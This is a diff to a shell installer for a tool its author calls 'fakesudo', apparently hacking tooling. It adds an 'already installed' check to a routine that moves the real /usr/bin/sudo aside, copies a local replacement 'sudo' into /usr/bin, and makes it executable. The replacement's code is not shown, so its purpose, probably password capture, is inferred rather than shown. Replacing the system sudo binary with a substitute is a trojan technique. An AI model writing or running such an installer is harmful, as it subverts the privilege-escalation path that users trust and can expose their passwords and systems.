@@ -4,7 +4,7 @@
 ## Author on Muhammed Taha                               ##
 ## Telegram Profile = https://t.me/FedoraVirus           ##
 ###########################################################
-__ScriptVersion="0.1";
+__ScriptVersion="1.0";
 
 main()
 {
@@ -61,18 +61,24 @@ getargs()
 
 install_fakesudo()
 {
-    echo "Installing fakesudo.. Please Wait..."
-    sleep 2
-    mkdir $HOME/SudoBackup/ 2> /dev/null
-    mv /usr/bin/sudo $HOME/SudoBackup/sudo.backup
-    cp -R $PWD/sudo /usr/bin/
-    chmod 755 /usr/bin/sudo
-    read -p "Press enter to complete setup, Type "sudo" to check.."
-    case $1 in
-    * ) 
-    	exit
-    ;;
-    esac
+	if [ "$(cat /usr/bin/sudo | head -n 3 | tail -n 1 | cut -f4 -d " ")" == "fakesudo" ]
+		then
+			echo "FakeSudo already installed"
+		else
+			echo "Installing fakesudo.. Please Wait..."
+	   		sleep 2
+			mkdir $HOME/SudoBackup/ 2> /dev/null
+			mv /usr/bin/sudo $HOME/SudoBackup/sudo.backup
+			cp -R $PWD/sudo /usr/bin/
+			chmod 755 /usr/bin/sudo
+	fi
+    
+	read -p "Press enter to complete setup, Type "sudo" to check.."
+	case $1 in
+	* ) 
+	    	exit
+	;;
+    	esac
 }
 
 remove_fakesudo()
